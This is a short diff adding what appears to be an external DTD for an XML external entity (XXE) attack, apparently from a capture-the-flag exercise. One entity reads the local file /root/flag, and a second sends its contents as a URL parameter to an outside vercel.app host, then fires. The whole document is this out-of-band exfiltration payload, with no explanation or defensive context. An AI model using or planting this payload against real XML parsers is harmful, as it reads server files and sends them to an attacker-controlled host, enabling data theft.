@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///root/flag">
+<!ENTITY % exfil SYSTEM "https://steppinstylepos.vercel.app/?p=%file;">
+%exfil;
